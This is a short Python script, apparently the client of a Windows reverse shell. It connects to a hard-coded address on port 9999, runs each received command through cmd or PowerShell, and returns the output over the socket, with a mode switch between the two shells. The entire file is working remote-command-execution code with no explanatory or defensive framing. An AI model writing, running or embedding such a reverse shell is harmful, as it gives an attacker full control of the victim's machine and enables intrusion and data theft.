import socket
import subprocess

HOST = '192.168.50.39'
PORT = 9999

mode = "cmd"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((HOST, PORT))
    while True:
        data = s.recv(4096)
        if not data:
            break
        command = data.decode().strip()

        if command == 'lsw ps':
            mode = "ps"
            s.sendall(b"[LSW] Switched to PowerShell mode.\n")
            continue
        elif command == 'lsw cmd':
            mode = "cmd"
            s.sendall(b"[LSW] Switched to CMD mode.\n")
            continue

        try:
            if mode == "ps":
                # Run command and capture both output and working directory
                prompt = subprocess.check_output(
                    ["powershell.exe", "-NoProfile", "-Command", "(Get-Location).Path"],
                    stderr=subprocess.STDOUT,
                    text=True
                ).strip()
                output = subprocess.check_output(
                    ["powershell.exe", "-NoProfile", "-Command", command],
                    stderr=subprocess.STDOUT,
                    text=True
                )
                full_output = f"{prompt}> {command}\n{output}"
            else:
                # CMD mode
                prompt = subprocess.check_output("cd", shell=True, text=True).strip()
                output = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                full_output = f"{prompt}> {command}\n{output}"
        except subprocess.CalledProcessError as e:
            full_output = f"{prompt}> {command}\n{e.output}"

        s.sendall(full_output.encode())
